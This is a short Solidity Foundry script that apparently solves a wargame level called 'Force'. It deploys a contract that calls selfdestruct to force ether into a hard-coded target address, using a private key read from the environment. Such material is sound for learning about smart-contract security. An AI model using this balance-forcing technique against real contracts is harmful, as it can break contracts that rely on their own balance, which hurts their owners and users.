// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import { Force } from "../src/Force.sol";

contract Suicider {
    constructor () {
        
    }
    function attack () external payable {
        selfdestruct(payable(0x7Cd565E3CCC53eb4D990c9bBdB41ba0617552432));
    }
}

contract ForceSolver is Script {

    Force public instance = Force(payable(0x7Cd565E3CCC53eb4D990c9bBdB41ba0617552432));

	uint256 prv = vm.envUint("PRV");
	address pub = vm.envAddress("PUB");

    function run() external {
        vm.startBroadcast(prv);
        
        Suicider s = new Suicider();
        address(s).call{value: 1 wei}(abi.encodeWithSignature("attack()"));

        vm.stopBroadcast();
    }

}

